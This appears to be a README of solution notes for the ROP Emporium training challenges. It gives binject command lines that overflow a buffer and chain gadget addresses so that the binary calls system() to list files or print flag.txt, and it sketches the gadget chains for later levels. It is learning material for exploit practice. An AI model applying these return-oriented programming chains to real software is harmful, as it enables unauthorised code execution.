# ROP Emporium challenge

## Used tools

- [binject](https://github.com/anarticho/binject)
- [ropper](https://github.com/sashs/Ropper)
- [rabbin2 from radar2](https://github.com/radareorg/radare2)
- [gdb-dashboard](https://github.com/cyrus-and/gdb-dashboard)
- [tgdb-based](https://github.com/ficoos/tgdbdb)

# ret2win

> binject -ns 40 A -x 560740 > key
> ./ret2win < key

# split

To reach usefulFunction and perform system("/bin/ls"), we need to assert a RET instruction in order to align the stack..
And then to effectively branch to the function.
> binject -ns 40 A -x 3E05400000000000 -x 4207400000000000
3E05400000000000: ret instruction
4207400000000000: usefulFunction entry point

To perform the challenge by printing the content of flag.txt:
> binject -ns 40 A -x C307400000000000 -x 6010600000000000 -x 4B07400000000000

As with:
- C307400000000000 the address for 'pop %rdi; ret' gadget,
- 6010600000000000 the address for '/bin/cat flag.txt' string,
- 4B07400000000000 the address for 'call <system>' instruction.

# callme

: OVERFLOW 40 A
: ROP gadget + parameters + callme_xxx
: ...
: ...
(look at c3_callme/bin/generate.sh)

# write4

A bit more complicated this one as:
- gadget to pop r14 and r15 values from stack
- gadget to mov r15 value to r14 location
- gadget to pop rdi from stack (as r14 location)
- gadget to call print_file

# badchars
